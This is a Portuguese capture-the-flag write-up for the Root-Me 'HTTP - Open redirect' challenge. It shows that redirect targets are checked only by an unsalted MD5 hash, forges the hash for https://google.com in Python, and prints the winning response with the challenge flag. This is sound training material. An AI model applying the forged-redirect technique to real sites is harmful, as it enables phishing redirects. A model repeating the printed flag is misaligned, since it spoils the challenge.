## HTTP - Open redirect 

Checando o código fonte, inspecionando elemento ou copiando o link, encontramos:

  - https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134

  - https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0

  - https://slack.com&h=e52dc719664ead63be3d5066c135b6da

A validação é feita por meio de hash MD5:

<pre>root@kali:~# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: a023cfbf5f1c39bdf8407f28b60cd134

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</pre>

É possível capturar a requisição com [Burp Suit](https://portswigger.net/burp) ou com a extensão [HTTP Header Live](https://addons.mozilla.org/pt-BR/firefox/addon/http-header-live/) de firefox, edita-la e fazer o reenvio:

Podemos gerar o hash md5 de https://google.com, enviar e olhar a resposta da requisição com Burp Suit:

<pre>root@kali:~# python2.7
Python 2.7.17 (default, Oct 19 2019, 23:36:22)
[GCC 9.2.1 20191008] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import md5
>>> md5.new('https://google.com').digest().encode('hex')
'99999ebcfdb78df077ad2727fd00969f'</pre>

## Resposta

<pre>HTTP/1.1 200 OK
Server: nginx
Date: Thu, 30 Jan 2020 20:03:20 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Content-Length: 1027

<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>


<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5</p><script>document.location = 'https://google.com';</script></pre>
